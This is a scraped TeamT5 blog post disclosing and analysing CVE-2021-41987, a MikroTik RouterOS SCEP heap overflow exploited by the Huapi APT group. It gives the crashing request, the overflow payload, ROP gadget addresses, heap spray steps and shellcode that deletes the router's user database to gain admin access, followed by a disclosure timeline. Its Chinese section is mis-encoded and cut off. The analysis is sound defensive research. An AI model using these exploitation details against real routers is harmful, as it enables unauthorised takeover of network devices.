style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="36" height="36" fill="none" aria-label="facebook-icon"><path fill="#4C433F" d="M3 0a3 3 0 0 0-3 3v30a3 3 0 0 0 3 3h12v-.03l.188.03V23.345h-4.57V18.11h4.57v-3.99c0-4.539 2.687-7.046 6.798-7.046 1.97 0 4.03.354 4.03.354v4.457h-2.27c-2.236 0-2.933 1.396-2.933 2.828v3.397h4.992l-.798 5.235h-4.195V36l.188-.03V36h12a3 3 0 0 0 3-3V3a3 3 0 0 0-3-3H3Z"></path></svg></button></a><a class="css-1dnxym2"><button aria-label="linkedin" class="react-share__ShareButton" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="36" height="36" fill="none" aria-label="linked-in-icon"><path fill="#4C433F" fill-rule="evenodd" d="M0 3a3 3 0 0 1 3-3h30a3 3 0 0 1 3 3v28.5c0 .084-.002.167-.007.249.005.059.007.119.007.18v1.446A2.625 2.625 0 0 1 33.375 36H3a3 3 0 0 1-3-3v-.257c0-.197.017-.386.05-.567A4.537 4.537 0 0 1 0 31.5v-27c0-.165.009-.329.026-.49A3.233 3.233 0 0 1 0 3.596V3Zm9.087 1.777a3.087 3.087 0 1 0 0 6.174 3.087 3.087 0 0 0 0-6.174ZM6.41 30.274h5.33v-17.02H6.41v17.02Zm13.887-14.85c.872-1.716 3.875-3.571 8.242-1.878 3.316 1.287 2.95 6.21 2.95 6.21v10.518h-5.3v-9.838c0-.564-.323-1.567-.427-1.728a2.825 2.825 0 0 1-.047-.076c-.126-.213-.381-.642-.825-.83-.507-.215-1.382-.43-2.335-.215-.952.215-1.736.937-1.982 1.828a8.062 8.062 0 0 0-.276 1.62v9.24h-5.27v-17.02h5.054v2.353h.081l.135-.184Z" clip-rule="evenodd"></path></svg></button></a><a class="css-1dnxym2"><button aria-label="twitter" class="react-share__ShareButton" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="37" height="37" fill="none" aria-label="twitter-icon"><path fill="#4C433F" fill-rule="evenodd" d="M2.354.269a2 2 0 0 0-2 2v32a2 2 0 0 0 2 2h32a2 2 0 0 0 2-2v-32a2 2 0 0 0-2-2h-32Zm28.62 4.5L20.923 16.453l10.931 15.91h-8.04l-7.361-10.714-9.217 10.713H4.854L15.395 20.11 4.855 4.769h8.04l6.97 10.145 8.727-10.145h2.382ZM16.592 18.717l1.069 1.528 7.274 10.406h3.659l-8.915-12.752-1.068-1.527-6.858-9.81H8.094l8.498 12.155Z" clip-rule="evenodd"></path></svg></button></a></div></div><div class="css-1rxodi3"><h3>Related Post</h3></div><div class="css-rtde4j"><div class="css-1xwdimk"><a href="/en/posts/another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities/"><div class="css-1diy1ct"><div class="css-1s0eqit">News</div><div class="css-1dskh0x"><span>2021.07.01</span><div class="css-znbnvb"></div></div><div class="css-46brdi" style="background-image:url(https://legacy-uploads.teamt5.org/north_korea_1151137_1920_0727509c9b.jpg)"></div></div></a><div class="css-5hidgr"><a href="/en/posts/another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities/"><h4 class="css-rn9eoi">Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities</h4></a><div class="css-1nrt9o1"></div><div class="css-xaihop">supply chain attack, cyber espionage, CloudDragon, South Korea, cyber threat intelligence, threat hunting</div></div></div><div class="css-1xwdimk"><a href="/en/posts/clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor/"><div class="css-1diy1ct"><div class="css-11h3arz">Threat Intelligence</div><div class="css-1dskh0x"><span>2021.06.30</span><div class="css-znbnvb"></div></div><div class="css-46brdi" style="background-image:url(https://uploads.teamt5.org/upload/files/flag_2528969_1920_10918af673_update.webp)"></div></div></a><div class="css-5hidgr"><a href="/en/posts/clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor/"><h4 class="css-rn9eoi">CloudDragon&#x27;s Campaign: VPN Zero-day Vulnerability + New Backdoor</h4></a><div class="css-1nrt9o1"></div><div class="css-xaihop">supply chain attack, cyber espionage, CloudDragon, cyber threat intelligence, threat hunting</div></div></div><div class="css-1xwdimk"><a href="/en/posts/a-deep-dive-into-powershell-s-constrained-language-mode/"><div class="css-1diy1ct"><div class="css-13ppfsu">Technical Analysis</div><div class="css-1dskh0x"><span>2021.02.17</span><div class="css-znbnvb"></div></div><div class="css-46brdi" style="background-image:url(https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_banner.jpg)"></div></div></a><div class="css-5hidgr"><a href="/en/posts/a-deep-dive-into-powershell-s-constrained-language-mode/"><h4 class="css-rn9eoi">A Deep Dive into PowerShell&#x27;s Constrained Language Mode</h4></a><div class="css-1nrt9o1"></div><div class="css-xaihop">PowerShell, Constrained Language Mode, cyber threat intelligence, threat hunting</div></div></div></div></div></div><div class="css-yx8k1m"><div class="css-k48dnj"><img class="css-1l12noq" src=""/><div class="css-up98ca"><svg viewBox="0 0 10 10" width="10" height="10" fill="#F5F2E9"><g transform="translate(-.333333 -.333333)"><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path><path d="m10.0473785.61928813c.2603496.26034952.2603496.68245951 0 .94280904l-3.77135252 3.77092881 3.77135252 3.77154352c.2603496.26034953.2603496.68245951 0 .942809-.26034949.2603496-.68245947.2603496-.942809 0l-3.77154352-3.77135252-3.77092881 3.77135252c-.26034953.2603496-.68245952.2603496-.94280904 0-.26034953-.26034949-.26034953-.68245947 0-.942809l3.77073785-3.77154352-3.77073785-3.77092881c-.26034953-.26034953-.26034953-.68245952 0-.94280904.26034952-.26034953.68245951-.26034953.94280904 0l3.77092881 3.77073785 3.77154352-3.77073785c.26034953-.26034953.68245951-.26034953.942809 0z"></path></g></svg></div></div></div></main><footer class="css-1d9e2gf"><div class="css-1sjdpqx"><div name="subscribe-section"></div><h3>Subscribe for the latest cyber threat analysis & news</h3><div class="css-1nevcxy"><div class="css-1uwy6if"><div class="css-cssveg"><input type="email" name="email" placeholder="subscribenow@gmail.com" data-testid="text-input-test-id" class="css-10t5c7o" value=""/></div><div class="css-jf1sy"></div></div><button data-testid="button" class="INIT css-ijwcic"><span class="slide"></span><span class="content">Subscribe Now</span></button></div><p class="css-cd9ufl"></p><p class="css-gb53pj">ï¼By pressing this button, you agree to TeamT5 Inc.&#x27;s Privacy Policy and allow us to send newsletters.</p></div><div class="css-1shon4x"><hr/></div><div class="css-wpfswj"><svg viewBox="0 0 84 84"><g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><polygon fill="#D93751" points="42 0 84 42 42 84 0 42"></polygon><path d="M57,56.7989281 L42,70.9217351 L27,56.7989281 M42,70.9217351 L42.5,39.9444444" stroke="#FFF" stroke-linecap="round" stroke-linejoin="round" transform="translate(42.000000, 55.222222) scale(1, -1) translate(-42.000000, -55.222222) "></path><text font-family="NotoSansCJKtc-Light, Noto Sans CJK TC" font-size="12" font-weight="300" fill="#FFF"><tspan x="30.612" y="32">TOP</tspan></text></g></svg></div><div class="css-2itsev"><div class="css-1jw0r0q"><a href="/en/"><img alt="TeamT5" loading="lazy" width="240" height="80" decoding="async" data-nimg="1" style="color:transparent" src="https://legacy-uploads.teamt5.org/assets/common/logo_contact_mqdew8.svg"/></a><div class="css-sfpfes"><a class="css-1kwq295" href="https://www.facebook.com/TeamT5.org/"><svg width="36" height="36" fill="none" aria-label="facebook-icon"><path fill="#4C433F" d="M3 0a3 3 0 0 0-3 3v30a3 3 0 0 0 3 3h12v-.03l.188.03V23.345h-4.57V18.11h4.57v-3.99c0-4.539 2.687-7.046 6.798-7.046 1.97 0 4.03.354 4.03.354v4.457h-2.27c-2.236 0-2.933 1.396-2.933 2.828v3.397h4.992l-.798 5.235h-4.195V36l.188-.03V36h12a3 3 0 0 0 3-3V3a3 3 0 0 0-3-3H3Z"></path></svg></a><a class="css-1kwq295" href="https://twitter.com/teamt5_official/"><svg width="37" height="37" fill="none" aria-label="twitter-icon"><path fill="#4C433F" fill-rule="evenodd" d="M2.354.269a2 2 0 0 0-2 2v32a2 2 0 0 0 2 2h32a2 2 0 0 0 2-2v-32a2 2 0 0 0-2-2h-32Zm28.62 4.5L20.923 16.453l10.931 15.91h-8.04l-7.361-10.714-9.217 10.713H4.854L15.395 20.11 4.855 4.769h8.04l6.97 10.145 8.727-10.145h2.382ZM16.592 18.717l1.069 1.528 7.274 10.406h3.659l-8.915-12.752-1.068-1.527-6.858-9.81H8.094l8.498 12.155Z" clip-rule="evenodd"></path></svg></a><a class="css-1kwq295" href="https://www.linkedin.com/company/teamt5/"><svg width="36" height="36" fill="none" aria-label="linked-in-icon"><path fill="#4C433F" fill-rule="evenodd" d="M0 3a3 3 0 0 1 3-3h30a3 3 0 0 1 3 3v28.5c0 .084-.002.167-.007.249.005.059.007.119.007.18v1.446A2.625 2.625 0 0 1 33.375 36H3a3 3 0 0 1-3-3v-.257c0-.197.017-.386.05-.567A4.537 4.537 0 0 1 0 31.5v-27c0-.165.009-.329.026-.49A3.233 3.233 0 0 1 0 3.596V3Zm9.087 1.777a3.087 3.087 0 1 0 0 6.174 3.087 3.087 0 0 0 0-6.174ZM6.41 30.274h5.33v-17.02H6.41v17.02Zm13.887-14.85c.872-1.716 3.875-3.571 8.242-1.878 3.316 1.287 2.95 6.21 2.95 6.21v10.518h-5.3v-9.838c0-.564-.323-1.567-.427-1.728a2.825 2.825 0 0 1-.047-.076c-.126-.213-.381-.642-.825-.83-.507-.215-1.382-.43-2.335-.215-.952.215-1.736.937-1.982 1.828a8.062 8.062 0 0 0-.276 1.62v9.24h-5.27v-17.02h5.054v2.353h.081l.135-.184Z" clip-rule="evenodd"></path></svg></a></div></div><div class="css-w9vsuy"><div class="css-sn55je"><a class="css-cyopkh disabled" href="/en/"><h6>SERVICE</h6></a><div class="css-1lt8ec3"><a class="css-1goxo4s" href="/en/service/mdr/">MDR</a><a class="css-1goxo4s" href="/en/service/ir/">IR</a></div></div><div class="css-sn55je"><a class="css-cyopkh disabled" href="/en/"><h6>PRODUCT</h6></a><div class="css-1lt8ec3"><a class="css-1goxo4s" href="/en/products/threatsonar-anti-ransomware/">ThreatSonar Anti-Ransomware</a><a class="css-1goxo4s" href="/en/products/threatsonar/">ThreatSonar</a><a class="css-1goxo4s" href="/en/products/threatvision/">ThreatVision</a><a class="css-1goxo4s" href="/en/products/deep-dark-web-intelligence/">Deep &amp; Dark Web Intelligence</a></div></div><div class="css-sn55je"><a class="css-cyopkh disabled" href="/en/"><h6>COMPANY</h6></a><div class="css-1lt8ec3"><a class="css-1goxo4s" href="/en/about-us/">ABOUT US</a><a class="css-1goxo4s" href="/en/careers/">CAREERS</a></div></div><div class="css-sn55je"><a class="css-cyopkh" href="/en/news-and-events/"><h6>NEWS &amp; EVENTS</h6></a></div><div class="css-sn55je"><a class="css-cyopkh" href="/en/blog/"><h6>BLOG</h6></a></div><div class="css-sn55je"><a class="css-cyopkh disabled" href="/en/"><h6>CONTACT US</h6></a><div class="css-1lt8ec3"><a class="css-1goxo4s" href="/en/contact-us/">CONTACT US</a><a class="css-1goxo4s" href="/en/partners/">PARTNERS</a><a class="css-1goxo4s" href="/en/media-kit/">Media Kit</a><a class="css-1goxo4s" href="/en/posts/teamt5-csirt/">TeamT5 CSIRT</a></div></div></div></div><div class="css-1shon4x"><hr/></div><div class="css-9e4kxr"><h6>CERTIFICATION</h6><img alt="ISO 27001" loading="lazy" width="158" height="80" decoding="async" data-nimg="1" style="color:transparent" src="https://uploads.teamt5.org/internal/footer/iso_27001.png"/></div><div class="css-1shon4x"><hr/></div><div class="css-13gtdbe"><div class="css-fk0xdk"><a class="right-policy-item" href="/en/privacy-and-cookies-policy/">Privacy &amp; Cookies Policy</a><a class="right-policy-item" href="/en/terms-of-service/">Terms of Service</a><a class="right-policy-item invisible" href="/en/security-policy/">Security Policy</a><div class="right-policy-item disabled">Â© 2025 TeamT5, Inc. All Rights Reserved.</div></div><div class="css-126i2w1"><div class="css-1h1q0ci"><svg width="24" height="24" fill="none" aria-label="earth-icon" class="css-m0eduh dark"><path fill="#4C433F" fill-rule="evenodd" d="M1 12c0-.064 0-.128.002-.192L1 11.744h.003c.048-2.126.7-4.103 1.791-5.767l-.003-.117h.08a10.99 10.99 0 0 1 8.646-4.85c.075-.006.15-.01.227-.01v.003C11.83 1 11.914 1 12 1c5.99 0 10.861 4.787 10.997 10.744H23l-.001.093L23 12c0 6.075-4.925 11-11 11l-.256-.003V23l-.159-.005a2.217 2.217 0 0 1-.068-.005C5.666 22.737 1 17.913 1 12Zm2.506-4.181a9.42 9.42 0 0 0-.97 4.01c.06 1.657 1.89 3.171 4.632 4.008A25.214 25.214 0 0 1 6.884 12c0-.684.025-1.353.074-2.004C5.44 9.49 4.224 8.74 3.506 7.82Zm3.622.608c-1.433-.53-2.427-1.284-2.716-2.086a9.489 9.489 0 0 1 4.409-3.259c-.797 1.32-1.385 3.183-1.693 5.345ZM8.471 10.4c-.034.52-.052 1.054-.052 1.6 0 1.526.14 2.963.382 4.234.996.184 2.073.285 3.199.285 1.027 0 2.013-.084 2.934-.239.247-1.282.392-2.735.392-4.28 0-.565-.02-1.118-.056-1.655a16.193 16.193 0 0 1-3.526.376c-1.15 0-2.256-.113-3.273-.322Zm6.641-1.597a14.517 14.517 0 0 1-3.368.383 14.67 14.67 0 0 1-3.12-.326c.482-3.586 1.74-6.164 3.001-6.318.124-.005.25-.007.375-.007l.103.005c1.26.133 2.52 2.691 3.01 6.263ZM16.78 9.91c.054.677.081 1.376.081 2.09 0 1.377-.103 2.698-.296 3.916 2.853-.808 4.788-2.337 4.896-4.023l.003-.088a9.418 9.418 0 0 0-1.192-4.411c-.618 1.06-1.866 1.932-3.492 2.516Zm2.425-4.05h-.041l-.006.121c-.08.887-1.047 1.747-2.555 2.353-.32-2.182-.926-4.054-1.745-5.36a9.475 9.475 0 0 1 4.347 2.886ZM3.18 15.441c1.109.825 2.581 1.482 4.279 1.905.33 1.409.792 2.63 1.362 3.572a9.494 9.494 0 0 1-5.641-5.477Zm5.955 2.236c.617 2.212 1.553 3.666 2.49 3.78.124.006.25.008.375.008.971 0 1.955-1.466 2.598-3.75a19.74 19.74 0 0 1-2.598.169c-.989 0-1.95-.072-2.865-.207Zm5.722 3.35a9.49 9.49 0 0 0 5.963-5.586c-1.167.869-2.738 1.55-4.55 1.97-.342 1.436-.822 2.673-1.413 3.615Z" clip-rule="evenodd"></path></svg><p class="dark">EN</p><svg width="16" height="16" fill="none" aria-label="dropdown-icon" class="css-cqhf6t dark footer"><path fill="#4C433F" fill-rule="evenodd" d="M2.295 6.295a1.01 1.01 0 0 1 1.427 0L8 10.568l4.278-4.273a1.01 1.01 0 0 1 1.427 0 1.006 1.006 0 0 1 0 1.424l-4.992 4.986a1.01 1.01 0 0 1-1.426 0L2.295 7.719a1.006 1.006 0 0 1 0-1.424Z" clip-rule="evenodd"></path></svg></div></div></div></footer></div><div class="css-19e4vf0"><span>We use cookies to provide you with the best user experience. By continuing to use this website, you agree to our<a class="css-zsv9kv" href="/en/privacy-and-cookies-policy/">Privacy &amp; Cookies Policy.</a></span><button data-testid="button" class="css-yp163g"><span class="slide"></span><span class="content">I Agree</span></button></div></div><div class="css-12go95f"></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"topBanner":{"banners":[{"id":"14","color":null,"url":"https://teamt5.org/jp/products/deep-dark-web-intelligence/?utm_source=top\u0026utm_medium=website","name":"ãNEW ! ããã£ã¼ãã¦ã§ãããã¼ã¦ã§ãèå¨ã¤ã³ããªã¸ã§ã³ã¹","locale":"jp","__typename":"ComponentHomeBanner"},{"id":"16","color":null,"url":"https://teamt5.org/en/products/deep-dark-web-intelligence/?utm_source=top\u0026utm_medium=website","name":"Key to Enterprise Resilience : Dark Web Intelligence ","locale":"en","__typename":"ComponentHomeBanner"},{"id":"17","color":null,"url":"https://teamt5.org/tw/products/deep-dark-web-intelligence/?utm_source=top\u0026utm_medium=website","name":"ä¼æ¥­è³å®é²ç¦¦çééµé»ï¼æç¶²æè³\u003e\u003e\u003eç«å³äºè§£\u003e\u003e\u003e","locale":"tw","__typename":"ComponentHomeBanner"}],"enableBanner":true,"from":"2024-03-31T16:00:00.000Z","to":null},"__N_SSG":true,"pageProps":{"post":{"id":"80","contents":[{"id":"101","locale":"en","title":"Vulnerability Exposure \u0026 Notification on Mikrotik (CVE-2021-41987) ","context":"## Brief\nIn 2021, we discovered an open directory on Huapiâs C2. We found the source code contained an exploit aiming at Mikrotik routers. More specifically, our analysis found that the exploit would allow the attackers to send specially crafted payloads to achieve Remote Code Execution (RCE) via WAN without any authentications. The targeted RouterOS products include mikrotik-tile-6.46.8, mikrotik-vm-64.8, and mikrotik-vm-6.48.\n\nTeamT5 alerted Mikrotik to patch this vulnerability upon discovery. The patch for this vulnerability was released on 2021/11/17 and can be downloaded from the official Mikrotik website. All affected organizations should update their RouterOS immediately to avoid actorsâ exploitation.\n\nHUAPI (aka BlackTech, Palmerworm, or PLEAD) has been active since 2007 and has been targeting Taiwan for over a decade. Huapiâs malwares are highly sophisticated, and some of them use unique anti-analysis packers. Some of Huapiâs malware utilized a modified RC4 algorithm to encrypt the malicious C2 communication. Huapi focused on governmental entities, technology or telecommunication industries, and think tanks. Our observation suggested that over half of the victims were governmental agencies in Taiwan, the United States, Japan, and South Korea.\n\n### Attack vector\nAs a powerful and easy-to-use router, Mikrotik routerboard supports SCEP (Simple Certificate Enrollment Protocol), a service that was designed for simple certificate delivery. During transport, the binary data is encoded in Base64 via HTTP GET. Unfortunately, when processing the data from the payload, a miscalculation may occur if the payload is not properly formatted, potentially resulting in a Heap-based Buffer Overflow.\n\nThe open directory we had discovered contained exploit code that targeted ```mikrotik-tile-6.46.8```, ```mikrotik-vm-64.8``` and ```mikrotik-vm-6.48```, along with their corresponding shellcode snippets. In the following sections, we will be analyzing the exploit code that was designed for ```mikrotik-vm-6.46.8```.\n\n#### Root cause analysis\nBy sending the following payload, we can cause the service ```www``` to crash and potentially trigger a Heap-based Buffer Overflow.\n\n ```GET /scep/{scep_server_name}?operation=PKIOperation\u0026message={} HTTP/1.1\\r\\n```\n\nThe crash can be traced back to the function ```base64Decode```, located under ```ScepRequest::parseRequest``` from ```/nova/lib/www/scep.p```. When unpacking the Base64 request, the following code is used to calculate the output buffer size,\n\n```output_buffer_length = 3 * (input_buffer_length \u003e\u003e 2)```\n\nâ¦which may cause a miscalculation of the output buffer, resulting in an insufficient memory allocation from ```malloc```, leading to a heap overflow.\n\n![Mikrotik 1.png](https://uploads.teamt5.org/upload/original/pic1_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n#### What happened?\n\nFor instance, we assume that the our input data is ```xxxxxxxxxxxxxxxxhCE```, and the length of input buffer is 19. Based on the decompiled code, ```out_len = 3 * (input_len \u003e\u003e 2)``` which is ```out_len = 3 * (input_len // 4)``` (double slashes represent integer division), thereby allocating 12 bytes as decoded data buffer. However, the decoded data buffer should be 14 bytes instead of 12. This oversight allows the attacker to overwrite data in heap.\n\n#### Overview of the exploit flow\nAccording to the chunk-recycling mechanism, by overwriting the chunk size of a chunk in bins to a larger value (```0x4121```), the next ```malloc``` call will return a heap chunk overlapped with allocated chunks. This will lead to a heap overflow when writing to the chunk.\n\nThe part which will be overwritten is a vtable pointer in a destructor (```sub_8052E90```) function, and by setting the register ```edx``` to ```0x8061a74```, the instruction ```call [edx+4]``` will execute the gadget at ```0x8058e89``` ( ```xchg eax, ebp; ret;``` ) and execute the shellcode after pivoting the stack to the attacker-owned buffer.\n\n![Mikrotik 2.png](https://uploads.teamt5.org/upload/original/pic2_vulnerability-mikrotik-cve-2021-41987.png)\n\n\n#### Heap spray\nThe attacker can begin heap spraying by requesting 64 concurrent connections, and close some of them in order to let the vtable pointer be overwriten by the heap overflow later.\n\n![Mikrotik 3.png](https://uploads.teamt5.org/upload/original/pic3_vulnerability-mikrotik-cve-2021-41987.png)\n\nThe function ```aaaa``` assembles the ROP gadgets, and the variable ```sc``` contains the shellcode for execution.\n![Mikrotik 4.png](https://uploads.teamt5.org/upload/original/pic4_vulnerability-mikrotik-cve-2021-41987.png)\n\n#### Trigger heap overflow\nThe function ```bbbb``` sends the payloads to the victim server in the aforementioned format.\n\n![Mikrotik 5.png](https://uploads.teamt5.org/upload/original/pic5_vulnerability-mikrotik-cve-2021-41987.png)\n![Mikrotik 6.png](https://uploads.teamt5.org/upload/original/pic6_vulnerability-mikrotik-cve-2021-41987.png)\n\nThe parameter message (```'x'*801*4+'hCE'```) in the function ```bbbb``` will overwrite the size of next chunk. Here in gdb , it shows that the parameter message has been decoded to ```c7 1c 71 84 21``` at ```0x80859f0```, and the last byte ```\\x21``` has been written as the next chunk size at ```0x80859f4```.\n\n![Mikrotik 7.png](https://uploads.teamt5.org/upload/original/pic7_vulnerability-mikrotik-cve-2021-41987.png)\n\n#### Attempting to retrieve the oversized chunk on heap\n![Mikrotik 8.png](https://uploads.teamt5.org/upload/original/pic8_vulnerability-mikrotik-cve-2021-41987.png)\n\nIn order to retrieve the overflowed chunk, we need to send out more request. At some point, the register ```edx``` will be set to ```0x8061a74``` when the attempt reaches ```i=3```.\n\n![Mikrotik 9.png](https://uploads.teamt5.org/upload/original/pic9_vulnerability-mikrotik-cve-2021-41987.png)\n\n#### Trigger destructor\nThe final step of the exploit, set off destructor  ```call [edx+4]``` by closing connections.\n![Mikrotik 10.png](https://uploads.teamt5.org/upload/original/pic10_vulnerability-mikrotik-cve-2021-41987.png)\n\n#### Fingers crossed\nThanks to the heap spraying at the initial phase of the exploit, the data in the address ```0x8061a74``` will be modified, thus the instruction ```call [edx+4]``` will end up calling ```0x8058e89``` instead (the address of gadget ```xchg eax, ebp; ret;```) and start executing our gadgets.\n\n![Mikrotik 11.png](https://uploads.teamt5.org/upload/original/pic11_vulnerability-mikrotik-cve-2021-41987.png)\n\nOnce the gadgets have been hit, ```0x8058e89: xchg eax, ebp; ret``` and ```0x8052eb9: leave``` will allow us to pivot from the stack to the controllable buffer and start to execute our ROP chain from ```0x804fbfc```.\n\nThe ROP chain will try to increase the address of ```open``` to the address of ```mprotect```, and the ```0x804fc04: pop esp; ret;``` will set ```esp``` to ```0x8061a74+8``` to wrap up the ROP chain. Lastly, calling ```mprotect``` and jump right into the shellcode (```0x8061674```).\n\n![Mikrotik 12.png](https://uploads.teamt5.org/upload/original/pic12_vulnerability-mikrotik-cve-2021-41987.png)\n\nIn the exploit, the shellcode can be interpreted as ```unlink('/nova/store/user.data') + sync() + reboot()```, after the target device has finished rebooting. The attacker should then be able to login into web service as admin without a password.\n\n### Conclusion\nTo wrap up, letâs go over the exploit code once again:\n\n**1. Low stability**\n\n- Since ```add()``` does not work in our favor and that ASLR is enabled by default, the exploit chain may fail on the first try.\n- Occasionally, even though the ```/nova/store/user.dat``` file will be deleted, the device does not end up rebooting. The shellcode may require extra improvements to make it more stable.\n- Even in best case scenario, the success rate is only about 5~6%.\n- Thankfully, in the event where the attack attempt fails, the watchdog process will restart the ```www``` service for us. This ensures stability and allows the attacker to not cause noticeable disruption during the attack.\n\n**2. Strict prerequisites**\n\n- The attacker must be aware of the path name ```scep_server_name``` before being able to begin such attack.\n\n**3. Disclosure Timeline**\n\n```2021/07/11```: Acquire exploit codes from the open directory\n\n```2021/10/04```: Responsible disclosure to Mikrotik and reserved CVE-2021-41987\n\n```2021/11/17```: Official patch released\n\n```2022/03/01```: Full disclosure released\n\n**4. Affected versions of RouterOS**\n- ```6.46.8```\n- ```6.47.9```\n- ```6.47.10```\n\n### About TeamT5 D39\nD39 is committed to the field of vulnerability security and vulnerability discovery. The research scope includes systems and devices that are connected to the Internet, such as mobile devices, IoT devices, Linux, and Windows. Our team has held a number of critical or important vulnerabilities and has conducted presentations across various major security conferences, such as Blackhat, HITCON, etc.\n\nExploit research has always been one of the most advanced fields in network attack and defense. TeamT5 expects to invest resources to cultivate more talents to enter this field, and expects to have more and more world-leading vulnerability research talents in Taiwan. We welcome those who dare to face unknown challenges, are committed to vulnerability research and discovery, and have independent research capabilities to join us. ð¤\n\n### Reference\n- https://wiki.mikrotik.com/wiki/Manual:System/Certificates\n- https://en.wikipedia.org/wiki/Base64\n\n*Image courtesy of Pixabay","__typename":"ComponentPostPostContext"},{"id":"102","locale":"tw","title":"Mikrotik æ¼æ´æ­é²èéå ± (CVE-2021-41987)","context":"## åè¨\nAPT é§­å®¢çµç¹ Huapi èª 2007 å¹´éå§æ´»èºè³ä»ï¼æ»æå°ç£è¶é 10 å¹´çæéãTeamT5 è§å¯å° Huapi æéç¼çæ¡æç¨å¼ï¼æææä½¿ç¨å æ®¼ä¾é»æç ç©¶äººå¡åæï¼ä¸éå¸¸æä½¿ç¨ä¿®æ¹å¾ç RC4 æ¼ç®æ³ä¾å å¯å³è¼¸ãHuapi é·ææ»ææ¿åºãé«ç§æãé»ä¿¡æç ç©¶æºåº«å®ä½ï¼æ ¹æ TeamT5 ççµ±è¨çµæï¼è¶é 5 æçåå®³å®ä½çºæ¿åºæ©éï¼åå®³åå®¶åå«å°ç£ãç¾åãæ¥æ¬ååéï¼å¶ä¸­éå°å°ç£æ¿åºæ©éé²è¡å¥ä¾µæ»æçºå¤ã\n\nä»°è³´æ¼é·æçè¿½è¹¤åè§å¯ï¼æåå¨ä¸å°ä¸­ç¹¼ç«ç¼ç¾å¬éç®éï¼ç®éä¸­å­å¨ä¸çµéå° Mikrotik SCEP æåç 0day æ»æç¨å¼ç¢¼ãå¨ç¢ºå®å¼±é»å­å¨å¾ï¼æåä¹å°å¼±é»çç¸éæå åå ±çµ¦ Mikrotik å®æ¹ï¼è®å®æ¹å¯ä»¥å¨ç¬¬ä¸æéå§é²è¡ä¿®è£éç¼ï¼ä»¥é¿åè©²å¼±é»ç¹¼çºè¢«æ¡ææ»æèé²è¡å©ç¨ã\n\nMikrotik å®æ¹æ¼ 2021/11/17 éåºäºä¿®æ­£çæ¬ï¼è«æä½¿ç¨å°åå½±é¿çæ¬çç¨æ¶ç¡éåç´ï¼ä»¥åé­åå±å®³ãéè£¡æåå°å®æ´æ­é²æ»æç¨å¼çå©ç¨ç´°ç¯åæ¼æ´åçï¼è®æåä¸çªº APT é§­å®¢çµç¹é½æ¯æéº¼çºéç®çãä¸æææ®µã\n\n### æ»æç¨å¼ååæ\nä½çºä¸ååè½å¼·å¤§ä¸ç°¡å®æç¨çè·¯ç±å¨ï¼Mikrotik routerboard ä¹æ¯æ´ç°¡å®æè­è¨»åéè¨åå®(Simple Certification Enrolling Protocol, SCEP)ï¼ä¾è®å¶ä»çµç«¯è£ç½®å¯ä»¥ç°¡ä¾¿çåå¾æéä¹æè­ãå¨åå®äº¤äºçéç¨ä¸­ï¼ææäºé²ä½è³è¨é½æä½¿ç¨ base64 ç·¨ç¢¼ä¹å¾åé²è¡å³éï¼ä½ç±æ¼ Mikrotik SCEP æåå¨é²è¡ base64 è§£ç¢¼çæåè¨ç®é¯èª¤ï¼æå°è´ Heap-based buffer overflow çç¼çã\n\næ»æç¨å¼ç¢¼(ä»¥ä¸ç°¡ç¨± exploit)ç¸½å±åå«äºéå°ä¸åä¸åçæ¬ç exploit code åå¥æ¯ ```mikrotik-tile-6.46.8```ã```mikrotik-vm-64.8```è```mikrotik-vm-6.48```ï¼åå¶ç¸å°æçæ¬ç shellcode ç¨ä»¥æ»ææåä¹å¾å·è¡é¡å¤çæ¡ææä»¤ã\n\nä»¥ä¸æ¯æåéå°çæ¬ ```mikrotik-vm-6.46.8``` é²è¡çexploitåæã\n\n### å¼±é»æ ¹å \nééä¸åç°¡å®ç HTTP è«æ±:\n\n```GET /scep/{scep_server_name}?operation=PKIOperation\u0026message={} HTTP/1.1\\r\\n```\n\nå°å¯ä»¥å¾å®¹æçè® ```www``` éåè² è²¬ HTTP æåç binary å´©æ½°ï¼ä¸¦è¢« watchdog éæ°ååã\n\nç¶éä¸çªéåå·¥ç¨å¾å¯ä»¥ç¼ç¾ï¼ä½æ¼ ```/nova/lib/www/scep.p``` ä¸­ç ```ScepRequest::parseRequest```ï¼å¨è§£é base64 ç·¨ç¢¼ç ```message``` åæ¸æï¼ç±æ¼è¨ç®è§£ç·¨ç¢¼å¾çè³æé·åº¦åºç¾é¯èª¤ï¼å°è´ malloc åéåºä¾çå¤§å°ä¸è¶³ï¼é²èé æ heap overflowï¼\n![Mikrotik 1.png](https://uploads.teamt5.org/upload/original/pic1_vulnerability-mikrotik-cve-2021-41987.png)\n\n### è® Base64 è®ææ¼æ´ï¼æ¯ä¸æ¯æé¯äºä»éº¼ ?\nèä¾ä¾èªªï¼åè¨­æåçè¼¸å¥è³ææ¯ ```xxxxxxxxxxxxxxxxhCE``` é·åº¦çº 19ï¼ä¾ç§éåå¾çç¨å¼éè¼¯ä¾çï¼SCEP è¨ç®åºè§£ç·¨ç¢¼å¾çé·åº¦æ¯12 ``` out_len = 3 * (in_len // 4)``` (ééç ```//``` çºæ´æ¸é¤æ³)ãä½å¯¦éä¸è§£ç·¨ç¢¼å¾çè³æé·åº¦çº 14ï¼éå°±ç´æ¥å°è´äº heap 